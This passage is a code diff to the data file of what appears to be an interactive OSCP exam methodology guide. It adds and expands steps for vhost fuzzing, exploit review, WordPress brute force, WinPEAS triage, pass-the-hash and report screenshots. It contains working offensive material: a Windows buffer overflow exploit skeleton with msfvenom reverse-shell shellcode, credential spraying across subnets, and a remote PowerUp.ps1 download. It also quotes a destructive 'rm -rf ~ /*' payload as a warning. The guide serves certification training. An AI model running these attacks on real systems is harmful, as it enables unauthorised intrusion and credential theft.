@@ -45,6 +45,7 @@ cd ~/results/$ip`,
     warn: null,
     choices: [
       { label: "Web attacks", next: "jump_web" },
+      { label: "Virtual host enumeration", next: "vhost_enum" },
       { label: "SQL injection", next: "jump_sqli" },
       { label: "Shells & payloads", next: "jump_shells" },
       { label: "Linux privesc", next: "jump_linux" },
@@ -78,6 +79,7 @@ cd ~/results/$ip`,
       { label: "Command injection", next: "cmd_injection" },
       { label: "WordPress", next: "wordpress" },
       { label: "Login page — brute / bypass", next: "login_page" },
+      { label: "Virtual host (vhost) enumeration", next: "vhost_enum" },
       { label: "Subdomain enumeration", next: "subdomain_enum" },
       { label: "Back to jump menu", next: "jump_menu" },
     ],
@@ -1184,22 +1186,80 @@ export PATH=/tmp:$PATH`,
     phase: "REPORT",
     title: "Documentation — The Path",
     body: "Structure your notes around MITRE ATT&CK tactics. Walk each tactic in order — it forces completeness and produces a report that speaks the language of every SOC, client, and hiring manager. Document AS YOU GO. OffSec has failed candidates with all flags for insufficient evidence.",
-    cmd: `# Set up your machine folder NOW — before you hack
-mkdir -p ~/results/$ip/{scans,exploits,loot,screenshots,tunnels}
+    cmd: `# ══ PRE-EXAM SETUP — DO THIS BEFORE CLICKING START ══
+mkdir -p ~/exam/{10.10.10.1,10.10.10.2,10.10.10.3,dc01,dc02}/{scans,exploits,loot,screenshots,notes}
+# One folder per target IP
 
-# ATT&CK Tactic flow for each machine:
-# TA0043 → Reconnaissance
-# TA0001 → Initial Access
-# TA0002 → Execution
-# TA0004 → Privilege Escalation
-# TA0006 → Credential Access      (if applicable)
-# TA0008 → Lateral Movement       (if applicable)
-# TA0007 → Discovery              (post-shell enum)
-# TA0040 → Impact                 (flags)
+# ══ SCREENSHOT REQUIREMENTS — OSCP 2024 FORMAT ══
+# OffSec requires SPECIFIC content in each screenshot
+# Missing content = points deducted even with a valid flag
 
-# Minimum screenshots per machine: 4
-# foothold + local.txt + privesc vector + proof.txt`,
-    warn: "Do not wait until the end to write notes. You will forget the middle — the middle is what OffSec grades.",
+# local.txt screenshot MUST show:
+# 1. Contents of local.txt (cat local.txt or type local.txt)
+# 2. Your current user (whoami or id)
+# 3. IP address of the machine (ipconfig or ip a)
+# Combine in one command:
+echo "=== LOCAL.TXT ===" && cat local.txt && id && ip a | grep "inet "
+type local.txt && whoami && ipconfig   # Windows
+
+# proof.txt screenshot MUST show:
+# 1. Contents of proof.txt (cat proof.txt or type proof.txt)
+# 2. Your current user — MUST be root/SYSTEM (id or whoami)
+# 3. IP address of the machine (ip a or ipconfig)
+echo "=== PROOF.TXT ===" && cat proof.txt && id && ip a | grep "inet "
+type proof.txt && whoami && ipconfig   # Windows (verify SYSTEM)
+
+# ══ MINIMUM SCREENSHOTS PER MACHINE ══════
+# The five required evidence screenshots:
+# 1. Initial foothold — first shell (id/whoami + hostname)
+# 2. local.txt — per requirements above
+# 3. Privilege escalation vector — the command that elevated you
+# 4. proof.txt — per requirements above
+# 5. Evidence of the initial vulnerability — the nmap version,
+#    the exploit output, the command injection proof
+
+# ══ DURING-EXAM NOTE TEMPLATE ════════════
+# Copy this structure into your CherryTree/Obsidian for each machine:
+
+## Machine: [IP]
+### Recon
+- nmap full scan: [date/time]
+- Open ports: [list]
+- Interesting findings: [versions, hostnames, notes]
+
+### Initial Access
+- Vulnerability: [name or CVE]
+- Exploit: [command or tool used]
+- Shell type: [nc/pwncat/msf]
+- User obtained: [username]
+
+### Privilege Escalation
+- Vector: [sudo/SUID/service/token/etc]
+- Command: [exact command]
+- Evidence: [what confirmed it worked]
+
+### Flags
+- local.txt: [hash]  — screenshot taken: Y
+- proof.txt: [hash]  — screenshot taken: Y
+
+# ══ ATT&CK TACTIC ORDER (for report body) ══
+# TA0043 Reconnaissance    → nmap output, service discovery
+# TA0001 Initial Access    → exploit used, CVE, how foothold was gained
+# TA0002 Execution         → how code was executed (shell, script, etc)
+# TA0004 Privilege Escalation → exact vector and commands
+# TA0006 Credential Access → any hashes/creds obtained
+# TA0008 Lateral Movement  → PtH, WinRM, psexec between machines
+# TA0007 Discovery         → post-shell enumeration
+# TA0040 Impact            → flags, proof of access
+
+# ══ REPORT ASSEMBLY (24-hour window) ══════
+# You have 24 hours AFTER the exam ends to submit
+# Use the OffSec provided Word template (download from exam control panel)
+# One machine section per machine in the report
+# Proofread: OSID on every page, all screenshots captioned
+# Archive: 7z a OSCP-OS-XXXXX-Exam-Report.7z OSCP-OS-XXXXX-Exam-Report.pdf
+# Upload to: https://upload.offsec.com`,
+    warn: "OffSec has failed candidates who owned all five machines with insufficient report evidence. The proof.txt screenshot MUST show root/SYSTEM + IP + flag contents in a single screenshot. A flag screenshot without the IP address or without showing privilege level has failed candidates. Take the screenshot immediately when you get the flag — before doing anything else.",
     choices: [
       { label: "TA0043 — Reconnaissance", next: "doc_recon" },
       { label: "TA0001 — Initial Access", next: "doc_initial_access" },
@@ -1700,44 +1760,187 @@ impacket-dpapi backupkeys --export -t domain/admin:'pass'@$ip`,
     ],
   },
 
+  exploit_readcheck: {
+    phase: "RECON",
+    title: "Read the Exploit — Before You Fire",
+    body: "You found a public exploit. This is the step most people skip. Running an exploit you haven't read is how you waste 45 minutes on the wrong version, crash the service, or backdoor your own machine. 90 seconds of reading saves hours. The exploit code is telling you exactly what it does — read it.",
+    cmd: `# ── OPEN AND READ THE EXPLOIT ────────────
+searchsploit -x <EDB-ID>
+# Or if already copied:
+cat exploit.py | head -60    # read the header comments first
+# Most exploits document their usage, target version, and requirements
+# at the top of the file
+
+# ── THE 8-POINT CHECKLIST ─────────────────
+# Work through these before typing python3 exploit.py:
+
+# 1. VERSION MATCH — does this exploit target YOUR exact version?
+#    "Tested on: Apache 2.4.49"  ← does your nmap match?
+#    Version mismatches are the #1 reason exploits fail silently
+cat targeted.txt | grep -i <service>
+
+# 2. REQUIRED ARGUMENTS — what does it need?
+#    Usage: exploit.py <URL> <LHOST> <LPORT>
+#    or: exploit.py -t TARGET -p PORT -u USER -p PASS
+#    Run it with no args first:
+python3 exploit.py
+
+# 3. HARDCODED VALUES — are there IPs that need changing?
+#    grep for common hardcoded patterns:
+grep -iE "127\.0\.0\.1|192\.168\.|10\.10\.|lhost|lport|YOUR_IP|attacker" exploit.py
+#    Replace any hardcoded Kali IP with your tun0 IP
+
+# 4. LANGUAGE VERSION — Python 2 or 3?
+head -1 exploit.py    # check shebang: #!/usr/bin/python vs #!/usr/bin/python3
+python3 exploit.py    # try 3 first
+python2 exploit.py    # fall back if syntax errors
+
+# 5. DEPENDENCIES — does it import anything non-standard?
+grep "^import\|^from" exploit.py
+# Missing module? pip3 install <module> --break-system-packages
+
+# 6. WHAT DOES SUCCESS LOOK LIKE?
+#    RCE → it prints command output or drops a shell
+#    File read → it prints file contents
+#    Auth bypass → it returns cookies or a token
+#    DoS → AVOID on OSCP unless you have no choice
+grep -iE "shell|exec|system|rce|cmd|command|whoami|id " exploit.py | head -10
+
+# 7. PAYLOAD / CALLBACK SETUP — does it need a listener?
+#    If it spawns a reverse shell you need nc/pwncat running first
+grep -iE "reverse|callback|connect back|LHOST|LPORT" exploit.py
+#    Start listener BEFORE running exploit:
+pwncat-cs -lp $LPORT
+
+# 8. COPY BEFORE MODIFYING ──────────────────
+searchsploit -m <EDB-ID>
+# NEVER modify /usr/share/exploitdb/ originals
+# Work on the copy in your current directory
+
+# ── MAKE YOUR MODIFICATIONS ───────────────
+# Minimum changes for most exploits:
+# - Update target IP/URL
+# - Update LHOST to your tun0 IP
+# - Update LPORT to your listener port
+ip a show tun0 | grep "inet " | awk '{print $2}' | cut -d/ -f1`,
+    warn: "The most common exploit failures: (1) wrong version — nmap shows 2.4.50, exploit targets 2.4.49; (2) hardcoded IP pointing at the exploit author's machine; (3) Python 2 script run with Python 3; (4) no listener running before the reverse shell callback fires. All four are caught by reading the exploit for 90 seconds before running it.",
+    choices: [
+      { label: "Exploit looks valid — set up listener and fire", next: "reverse_shell" },
+      { label: "Needs credential we don't have", next: "bruteforce" },
+      { label: "Python errors — needs porting", next: "exploit_compile" },
+      { label: "Wrong version — back to searchsploit", next: "searchsploit_web" },
+    ],
+  },
+
   bof: {
     phase: "SHELL",
     title: "Buffer Overflow (Windows x86)",
-    body: "PEN-200 BOF methodology: fuzz → offset → EIP control → bad chars → shellcode. Structured process. Don't skip steps.",
-    cmd: `# 1. Fuzz — find crash length
-python3 -c "print('A' * 2000)" | nc $ip <PORT>
+    body: "PEN-200 BOF methodology: seven steps in strict order. Every step depends on the previous. Skipping steps is why exploits fail. This is a deterministic process — if the offset is right, the bad chars are clean, and the JMP ESP is valid, the exploit will work. Set up Immunity Debugger + mona.py on your Windows dev machine and work through each step. Do not proceed to the next step until the current one is confirmed.",
+    cmd: `# ══ ENVIRONMENT SETUP ════════════════════
+# Immunity Debugger: https://immunityinc.com/products/debugger/
+# mona.py: copy to C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands\
+# In Immunity console: !mona config -set workingfolder C:\mona\%p
 
-# 2. Find exact offset
-msf-pattern_create -l 2000
-msf-pattern_offset -l 2000 -q <EIP_VALUE>
+# ══ STEP 1: FUZZING — find the crash length ═
+# Send incrementally longer buffers until the service crashes
+# Note: EXACTLY what length caused the crash
 
-# 3. Confirm EIP control
-python3 -c "print('A'*OFFSET + 'B'*4 + 'C'*(2000-OFFSET-4))"
+import socket, time
+buffer = b"A" * 100
+while True:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
+        s.connect(("$ip", PORT))
+        s.send(PREFIX + buffer + SUFFIX)
+        s.close()
+        print(f"Sent {len(buffer)} bytes — no crash")
+        buffer += b"A" * 100
+        time.sleep(1)
+    except:
+        print(f"Crashed at ~{len(buffer)} bytes")
+        break
 
-# 4. Find bad chars — send all bytes 0x01-0xFF
-# Compare in Immunity Debugger vs known good
+# ══ STEP 2: FIND EXACT OFFSET ═════════════
+# Create a unique pattern of length = crash_length + 400 (buffer)
+msf-pattern_create -l <CRASH_LENGTH>
+# Send the pattern — note EIP value in Immunity when it crashes
+msf-pattern_offset -l <CRASH_LENGTH> -q <EIP_VALUE>
+# Output: "Exact match at offset XXXX"
 
-# 5. Find JMP ESP (no ASLR/DEP)
-msf-nasm_shell
-> jmp esp   # → get opcode e.g. FFE4
-# Find in Immunity: !mona jmp -r esp -cpb "\\x00"
+# ══ STEP 3: CONFIRM EIP CONTROL ══════════
+# Replace offset bytes with A, EIP with B (0x42424242), rest with C
+python3 -c "print('A'*OFFSET + 'BBBB' + 'C'*(CRASH_LENGTH-OFFSET-4))"
+# In Immunity: EIP should be 42424242 exactly
+# ESP should point to the C buffer (your shellcode landing zone)
 
-# 6. Generate shellcode
+# ══ STEP 4: FIND BAD CHARS ════════════════
+# Generate all bytes 0x01-0xFF (skip 0x00 — null always bad)
+python3 -c "
+bad_chars = b''
+for i in range(1, 256):
+    bad_chars += bytes([i])
+print(repr(bad_chars))
+"
+# Send: A*OFFSET + BBBB + bad_chars
+# In Immunity: Right-click ESP → Follow in Dump
+# !mona bytearray -b '\x00'    # generate reference in mona
+# !mona compare -f bytearray.bin -a <ESP_ADDRESS>
+# Note EVERY bad char — including chars that corrupt the NEXT byte
+# Re-run until mona says "Unmodified"
+
+# ══ STEP 5: FIND JMP ESP ══════════════════
+# Find a JMP ESP instruction in a module without ASLR/DEP/SafeSEH
+# In Immunity:
+!mona jmp -r esp -cpb "\x00<badchars>"
+# Returns addresses — use one from a module without protections
+# Note address in LITTLE ENDIAN format:
+# Address: 0x625011AF → payload bytes: \xAF\x11\x50\x62
+
+# Verify: set breakpoint on the JMP ESP address in Immunity
+# Run exploit — debugger should pause at your breakpoint
+# Then F7 → should land in C buffer (shellcode space)
+
+# ══ STEP 6: GENERATE SHELLCODE ════════════
+# Exclude null byte AND all bad chars found in step 4
 msfvenom -p windows/shell_reverse_tcp \\
-  LHOST=$LHOST LPORT=$LPORT \\
-  EXITFUNC=thread -b "\\x00" -f py
+  LHOST=$LHOST LPORT=443 \\
+  EXITFUNC=thread \\
+  -b "\\x00\\xBAD\\xCHARS" \\
+  -f py -v shellcode
+# -f py         → Python format (buf = b"\x41...")
+# -v shellcode  → variable named 'shellcode'
+# EXITFUNC=thread → keeps service stable after shell exits
+# Use port 443 or 80 — egress filtering on high ports
 
-# 7. Final exploit structure
-offset = EXACT_OFFSET
-padding = b"A" * offset
-eip = b"\\xAD\\xDE\\xXX\\xXX"  # JMP ESP address LE
-nop_sled = b"\\x90" * 16
-shellcode = b"PASTE_MSFVENOM_OUTPUT"
-payload = padding + eip + nop_sled + shellcode`,
-    warn: "Always include NOP sled (\\x90 * 16) before shellcode. Account for EXITFUNC=thread to keep service stable.",
+# ── CHECK SHELLCODE SIZE ──────────────────
+# Your C buffer (ESP space) must be large enough for shellcode
+# msfvenom windows/shell_reverse_tcp = ~341 bytes
+# C buffer = CRASH_LENGTH - OFFSET - 4 bytes
+# Must be > shellcode_size + nop_sled
+
+# ══ STEP 7: BUILD FINAL EXPLOIT ════════════
+import socket
+
+offset = EXACT_OFFSET          # from step 2
+retn = b"\xAF\x11\x50\x62"  # JMP ESP address LE from step 5
+padding = b"\x90" * 16         # NOP sled — 16 bytes minimum
+shellcode = (                   # paste msfvenom output here
+    # paste msfvenom output here (buf = b"\x41...")
+)
+
+payload = b"A" * offset + retn + padding + shellcode
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("$ip", PORT))
+s.send(PREFIX + payload + SUFFIX)
+s.close()
+print("Sent. Check your listener.")`,
+    warn: "NOP sled (\x90 * 16) goes between EIP/retn and shellcode — gives shellcode room to land. EXITFUNC=thread prevents crashing the service when your shell exits. The most common failures: (1) bad chars not fully eliminated — mona compare shows Unmodified before moving on; (2) shellcode too large for ESP buffer space — increase fuzz length to give more C-buffer room; (3) forgot to update LHOST in msfvenom; (4) high listener port blocked — use 443. If the shell fires and immediately dies: EXITFUNC=thread is the fix.",
     choices: [
-      { label: "Exploit worked — got shell", next: "shell_upgrade" },
-      { label: "Shell died immediately — try EXITFUNC=thread", next: "bof" },
+      { label: "Shell caught — stabilize it", next: "shell_upgrade" },
+      { label: "Exploit fires but shell dies — EXITFUNC", next: "bof" },
+      { label: "EIP not 42424242 — recheck offset", next: "bof" },
     ],
   },
 
@@ -3289,8 +3492,71 @@ done`,
       { label: "Splunk on 8000/8089", next: "splunkd" },
       { label: "URL has parameter (?id=1, ?page=, ?file=)", next: "param_found" },
       { label: "Outdated server version — searchsploit it", next: "searchsploit_web" },
-      { label: "New hostname in cert/headers — add to /etc/hosts", next: "subdomain_enum" },
+      { label: "Found domain name / hostname in cert or headers", next: "vhost_enum" },
+      { label: "New subdomain (DNS-based)", next: "subdomain_enum" },
       { label: "Nothing obvious — fuzz deeper", next: "web_fuzz_deep" },
+    ],
+  },
+
+  vhost_enum: {
+    phase: "WEB",
+    title: "Virtual Host Enumeration",
+    body: "Virtual hosting is one of the most common reasons a box looks dead on the IP but has a full attack surface on a hostname. The IP returns a default Apache/nginx page; the real app lives on dev.domain.htb, admin.domain.htb, or something custom. This is a mandatory step whenever you find a domain name anywhere — TLS cert, nmap output, page source, /etc/hosts on a compromised machine. vhost fuzzing is different from subdomain fuzzing: it sends the word as a Host header to the same IP, not a DNS lookup. The response size difference is your signal.",
+    cmd: `# ── STEP 0: FIND THE DOMAIN NAME FIRST ──
+# From TLS certificate (most reliable):
+openssl s_client -connect $ip:443 </dev/null 2>/dev/null \
+  | openssl x509 -noout -text \
+  | grep -E "Subject:|DNS:"
+# Look for: CN=domain.htb, DNS:*.domain.htb, DNS:admin.domain.htb
+
+# From nmap output (already in your scan):
+grep -E "hostname|commonName|Subject" targeted.txt
+# smb-os-discovery also shows computer name → hint at domain
+
+# From page source:
+curl -s http://$ip | grep -iE "href|action|src" | grep -v "http://$ip" | head -20
+# Look for: href="http://dev.domain.htb" or internal hostnames
+
+# From HTTP headers:
+curl -sv http://$ip 2>&1 | grep -iE "location:|set-cookie:|host:"
+# Redirect Location headers often contain the real hostname
+
+# ── STEP 1: ADD KNOWN DOMAIN TO /etc/hosts ──
+echo "$ip domain.htb" >> /etc/hosts
+curl -sv http://domain.htb    # compare to http://$ip — different content = vhost confirmed
+
+# ── STEP 2: FUZZ VHOSTS — ffuf (preferred) ──
+# ffuf sends each word as the Host header to the same IP
+# The size filter removes the default page (get baseline first):
+curl -s http://$ip | wc -c        # baseline size — note this number
+
+ffuf -u http://$ip \
+  -H "Host: FUZZ.domain.htb" \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
+  -fs <BASELINE_SIZE> \
+  -o scans/vhosts.txt
+
+# gobuster vhost mode:
+gobuster vhost -u http://domain.htb \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
+  --append-domain \
+  -o scans/vhosts.txt
+
+# ── STEP 3: ADD ALL FINDINGS TO /etc/hosts ──
+echo "$ip dev.domain.htb admin.domain.htb internal.domain.htb" >> /etc/hosts
+
+# ── STEP 4: ENUMERATE EACH VHOST INDEPENDENTLY ──
+# Each vhost is a fresh attack surface — full web enum from scratch
+# Different app on dev vs admin vs internal
+for host in dev admin internal test staging api; do
+  echo "=== Testing: $host.domain.htb ==="
+  curl -sv -H "Host: $host.domain.htb" http://$ip 2>&1 | grep -E "HTTP|Content-Length|Location"
+done`,
+    warn: "The size filter (-fs) is critical. Without it, ffuf returns every word as a 'hit' because the server returns 200 with the default page. Get the baseline content-length first (curl $ip | wc -c) and filter exactly that. If the baseline varies by a few bytes, use a range: -fs 1234,1235,1236. Also check HTTPS (port 443) separately — the cert SAN field often lists all vhosts directly.",
+    choices: [
+      { label: "Found vhost — enumerate it as new web target", next: "web_enum" },
+      { label: "Nothing found — DNS subdomain enum", next: "subdomain_enum" },
+      { label: "Found admin panel vhost", next: "login_page" },
     ],
   },
 
@@ -3429,22 +3695,72 @@ true                             # JSON boolean
   wordpress: {
     phase: "WEB",
     title: "WordPress",
-    body: "Run WPScan hard. Vulnerable plugins are the most reliable attack vector. Enumerate users, all plugins, all themes.",
-    cmd: `# Full aggressive scan (free API token available at wpscan.com)
-wpscan --url http://$ip \\
-  --enumerate u,ap,at \\
-  --plugins-detection aggressive \\
-  --api-token <TOKEN>
+    body: "WordPress has a consistent attack surface. Vulnerable plugins are the most reliable path — more CVEs per square inch than any other CMS. xmlrpc.php enables amplified brute force (500 cred attempts per request). User enumeration via /wp-json/wp/v2/users or ?author=1 gives you valid usernames for targeted attacks. Admin access gives you the theme editor = RCE. The goal is: enumerate → users → admin creds → shell.",
+    cmd: `# ── STEP 0: CONFIRM WP AND VERSION ───────
+curl -s http://$ip | grep -i "wp-content\\|wp-includes\\|WordPress"
+curl -s http://$ip/wp-login.php | head -5
 
-# Brute force once you have usernames
-wpscan --url http://$ip -U admin,editor \\
+# Version detection:
+curl -s http://$ip/readme.html | grep -i version
+curl -s http://$ip | grep "ver=" | grep "wp-content" | head -5
+
+# ── STEP 1: WPSCAN ────────────────────────
+# Free API token from wpscan.com — enables vuln data
+wpscan --url http://$ip \\
+  --enumerate u,ap,at,cb,dbe \\
+  --plugins-detection aggressive \\
+  --api-token <TOKEN> \\
+  -o scans/wpscan.txt
+
+# No token:
+wpscan --url http://$ip --enumerate u,ap,at -o scans/wpscan.txt
+
+# ── STEP 2: USER ENUMERATION ─────────────
+# REST API (default exposed WP 4.7+)
+curl -s http://$ip/wp-json/wp/v2/users | python3 -m json.tool
+
+# Author URL enumeration
+for i in $(seq 1 10); do
+  curl -s -o /dev/null -w "$i: %{redirect_url}\\n" "http://$ip/?author=$i"
+done
+
+# ── STEP 3: XMLRPC ABUSE ──────────────────
+# Check if exposed:
+curl -s http://$ip/xmlrpc.php
+# "XML-RPC server accepts POST requests only" = enabled
+
+# WPScan xmlrpc — 500 attempts per request:
+wpscan --url http://$ip \\
+  -U admin,administrator \\
   -P /usr/share/wordlists/rockyou.txt \\
-  --password-attack xmlrpc-multicall`,
-    warn: null,
+  --password-attack xmlrpc-multicall
+
+# ── STEP 4: PLUGIN CVE SEARCH ────────────
+# WPScan lists installed plugins + versions in output
+# Searchsploit every one:
+searchsploit wordpress <plugin_name>
+searchsploit <plugin_name> <version>
+
+# High-value plugin vulns (common on OSCP):
+# WP File Manager 6.0-6.9    → unauthenticated RCE
+# Duplicator < 1.3.28         → path traversal
+# Contact Form 7 < 5.3.2      → unrestricted file upload
+
+# ── STEP 5: DEFAULT CREDS ────────────────
+# Always try before brute force:
+# admin:admin  admin:password  admin:[sitename]  admin:[domain]
+
+# ── STEP 6: BRUTE FORCE ──────────────────
+wpscan --url http://$ip \\
+  -U admin \\
+  -P /usr/share/wordlists/rockyou.txt \\
+  --password-attack wp-login -t 50`,
+    warn: "xmlrpc.php is the fastest brute path — 500 attempts per HTTP request vs 1 with wp-login. Always check /wp-json/wp/v2/users first for free username enumeration. If the WPScan API token finds a vulnerable plugin, searchsploit it before pivoting to brute force — a plugin RCE doesn't need creds at all.",
     choices: [
-      { label: "Got admin creds — shell via theme editor", next: "wp_shell" },
-      { label: "Found vulnerable plugin — searchsploit it", next: "searchsploit_web" },
-      { label: "No creds yet — keep enumerating", next: "web_fuzz_deep" },
+      { label: "Got admin creds — theme editor or plugin shell", next: "wp_shell" },
+      { label: "Found vulnerable plugin — read and fire", next: "exploit_readcheck" },
+      { label: "xmlrpc.php exposed — brute force", next: "bruteforce" },
+      { label: "No attack surface — fuzz deeper", next: "web_fuzz_deep" },
     ],
   },
 
@@ -4597,6 +4913,7 @@ searchsploit vsftpd
 # Try it anyway — patch levels often don't close the exact vuln`,
     warn: "READ THE CODE before running any public exploit. The 0pen0wn SSH exploit is the famous example — it decoded to 'rm -rf ~ /* 2>/dev/null &' and would wipe your Kali machine. This is not hypothetical. Searchsploit returns local results from /usr/share/exploitdb/ — run 'sudo apt update && sudo apt install exploitdb' before an engagement to make sure it's current. Never modify exploits in their original location — always -m to copy first.",
     choices: [
+      { label: "Found an exploit — read it before running", next: "exploit_readcheck" },
       { label: "Got shell — stabilize it", next: "shell_upgrade" },
       { label: "Exploit needs credentials — go find them", next: "bruteforce" },
       { label: "Nothing in searchsploit — widen the search", next: "searchsploit_web" },
@@ -5877,6 +6194,56 @@ C:\Windows\Temp\sb.exe TokenGroups TokenPrivileges UAC`,
       { label: "Weak service permissions", next: "weak_service" },
       { label: "Stored credentials found", next: "windows_creds" },
       { label: "Nothing clear — go manual", next: "windows_manual_enum" },
+      { label: "WinPEAS output overwhelming — help me read it", next: "wp_output_triage" },
+    ],
+  },
+
+  wp_output_triage: {
+    phase: "WINDOWS",
+    title: "WinPEAS — Reading the Output",
+    body: "WinPEAS produces 800-2000 lines. The color system: RED = high confidence exploitable, YELLOW = interesting needs verification, cyan = informational. Do not read sequentially. Read five sections in priority order — everything else is noise unless those five produce nothing.",
+    cmd: `# ══ READING ORDER — triage, not sequential ══
+
+# ── PRIORITY 1: TOKEN PRIVILEGES (fastest win) ──
+Select-String -Path wp_out.txt -Pattern "SeImpersonatePrivilege|SeAssignPrimaryToken"
+# SeImpersonatePrivilege ENABLED → GodPotato/PrintSpoofer → SYSTEM now
+# Must be 'Enabled' not just 'Present' — check the third column
+
+# ── PRIORITY 2: ALWAYSINSTALLELEVATED ─────
+Select-String -Path wp_out.txt -Pattern "AlwaysInstallElevated"
+# BOTH HKLM and HKCU must be 0x1 — one key alone is not enough
+
+# ── PRIORITY 3: SERVICE VULNERABILITIES ───
+Select-String -Path wp_out.txt -Pattern "Unquoted|No quotes|can write|Weak permissions|modifiable binary"
+# "No quotes and Space detected" in WinPEAS = unquoted service path
+# "Everyone" or "BUILTIN\Users" with Write/Full = weak service perms
+
+# ── PRIORITY 4: STORED CREDENTIALS ────────
+Select-String -Path wp_out.txt -Pattern "password|Password|credential|cmdkey" | \
+  Select-String -NotMatch "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session"
+# Look for lines with actual values, not system key noise
+
+# ── PRIORITY 5: SCHEDULED TASKS ───────────
+Select-String -Path wp_out.txt -Pattern "Task To Run|Run As User" | \
+  Select-String -NotMatch "Microsoft|N/A"
+# Tasks running as SYSTEM with writable script paths = privesc
+
+# ══ KALI GREP (after transferring output file) ══
+grep -iE "seimpersonate|alwaysinstall|unquoted|no quotes|VULNERABLE" wp_out.txt
+grep -iE "password|credential|cmdkey" wp_out.txt | grep -iv "system32\|default\|control set"
+
+# ══ POWERUP AS CROSS-CHECK ════════════════
+# WinPEAS and PowerUp catch different things — run both
+iwr http://$LHOST/PowerUp.ps1 -OutFile C:\\Windows\\Temp\\pu.ps1
+. C:\\Windows\\Temp\\pu.ps1; Invoke-AllChecks | Out-File C:\\Windows\\Temp\\pu_out.txt`,
+    warn: "SeImpersonatePrivilege must show 'Enabled' in whoami /priv — 'Present' but disabled is not exploitable. AlwaysInstallElevated needs BOTH registry keys to be 0x1. A writable service binary path is only useful if YOUR current user has Write permission — verify with icacls before attempting.",
+    choices: [
+      { label: "SeImpersonatePrivilege Enabled", next: "token_privs" },
+      { label: "AlwaysInstallElevated — both keys 0x1", next: "always_install_elevated" },
+      { label: "Unquoted service path found", next: "unquoted_service" },
+      { label: "Weak service permissions", next: "weak_service" },
+      { label: "Credentials in output", next: "windows_creds" },
+      { label: "Nothing actionable — go manual", next: "windows_manual_enum" },
     ],
   },
 
@@ -6070,25 +6437,55 @@ dir /s /b C:\\*.config 2>nul`,
   pth: {
     phase: "WINDOWS",
     title: "Pass the Hash",
-    body: "NTLM hashes authenticate without cracking. evil-winrm, psexec, wmiexec — all work with hashes directly.",
-    cmd: `# evil-winrm (WinRM — port 5985/5986)
+    body: "NTLM hashes authenticate without cracking — you do not need to crack them. The format is LM:NTLM — you only need the NTLM part (after the colon). evil-winrm for WinRM (5985), psexec for SMB + service (gives SYSTEM, noisier), wmiexec for stealth (no service written). Verify with CME first before attempting a connection — saves time. This works for local admin and domain admin hashes alike. If the hash is from secretsdump output, grab the 4th field.",
+    cmd: `# ── STEP 0: PARSE THE HASH ────────────────
+# secretsdump output format:
+# Administrator:500:LM_HASH:NTLM_HASH:::
+# You want the NTLM part (4th field, after 3rd colon)
+# Example: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
+#                                          ^^^^ this is the NTLM hash
+
+# ── STEP 1: VERIFY HASH WORKS (CME) ──────
+# Always verify before attempting a full connection
+crackmapexec smb $ip -u administrator -H <NTLM_HASH>
+crackmapexec winrm $ip -u administrator -H <NTLM_HASH>
+# "(Pwn3d!)" in output = local admin confirmed
+
+# Try across subnet if in AD environment:
+crackmapexec smb 172.16.1.0/24 -u administrator -H <NTLM_HASH> --local-auth
+
+# ── STEP 2: GET A SHELL ───────────────────
+# evil-winrm — best for WinRM (port 5985/5986)
 evil-winrm -i $ip -u administrator -H <NTLM_HASH>
 
-# impacket-psexec
+# impacket-psexec — SMB + service (SYSTEM shell, noisier)
+impacket-psexec administrator@$ip -hashes :NTLM_HASH
 impacket-psexec domain/administrator@$ip -hashes :NTLM_HASH
 
-# impacket-wmiexec (stealthier)
-impacket-wmiexec domain/administrator@$ip -hashes :NTLM_HASH
+# impacket-wmiexec — stealth (no service written to disk)
+impacket-wmiexec administrator@$ip -hashes :NTLM_HASH
 
-# impacket-smbexec
+# impacket-smbexec — SMB only, no disk write
 impacket-smbexec domain/administrator@$ip -hashes :NTLM_HASH
 
-# CME verification
-crackmapexec smb $ip -u administrator -H <NTLM_HASH>
-crackmapexec winrm $ip -u administrator -H <NTLM_HASH>`,
-    warn: null,
+# ── STEP 3: LATERAL MOVEMENT WITH HASH ───
+# Hash from one machine → try on all machines in subnet
+for host in $(cat internal_live.txt); do
+  crackmapexec smb $host -u administrator -H <NTLM_HASH> --local-auth
+done
+
+# ── STEP 4: CRACK IF PtH FAILS ────────────
+# PtH requires NTLM auth — Kerberos-only environments block it
+# If connections fail, try cracking the hash instead:
+echo "<NTLM_HASH>" > hash.txt
+hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
+# -m 1000 = NTLM`,
+    warn: "PtH format for impacket tools: -hashes LM:NTLM or -hashes :NTLM (just colon + NTLM if you don't have LM). evil-winrm uses -H NTLM with no colons. If CME shows (Pwn3d!) but evil-winrm fails, WinRM may not be enabled — try psexec or wmiexec on 445. PtH doesn't work against Kerberos-only targets (common on newer AD setups) — crack the hash or use a TGT/TGS ticket instead.",
     choices: [
-      { label: "Got admin shell!", next: "got_root_windows" },
+      { label: "Got shell — SYSTEM on standalone", next: "got_root_windows" },
+      { label: "Got shell — domain machine, keep moving", next: "lateral_movement" },
+      { label: "CME shows Pwn3d across multiple machines", next: "lateral_movement" },
+      { label: "PtH blocked — crack the hash instead", next: "hashcrack" },
     ],
   },
 
@@ -7165,35 +7562,81 @@ mkdir -p ~/exam/{machine1,machine2,machine3,ad}/{scans,exploits,loot,screenshots
   mindset_stuck: {
     phase: "MINDSET",
     title: "Arjuna on Kurukshetra",
-    body: "You are not failing. The mind has contracted. Arjuna froze before the greatest battle of his life — not from lack of skill, but from overwhelm. Krishna did not tell him to try harder. He told him to see clearly. Stop. Do that now.",
-    cmd: `# ── STOP THE SPIRAL ─────────────────────
-# Close unnecessary terminals. One window.
-# Write down — right now — what you actually know:
+    body: "You are not failing. The mind has contracted. Arjuna froze before the greatest battle of his life — not from lack of skill, but from overwhelm. Krishna did not tell him to try harder. He told him to see clearly. Stop. Work through this checklist now. The answer is usually in what you have already seen.",
+    cmd: `# ══ STOP. CLOSE EXTRA TERMINALS. ONE WINDOW. ══
 
-echo "Machine: $ip"
-echo "Ports open: [list them]"
-echo "Services: [list them]"
-echo "What I tried: [list it]"
-echo "What actually happened: [not what you expected — what happened]"
-echo "What I have NOT tried: [honest list]"
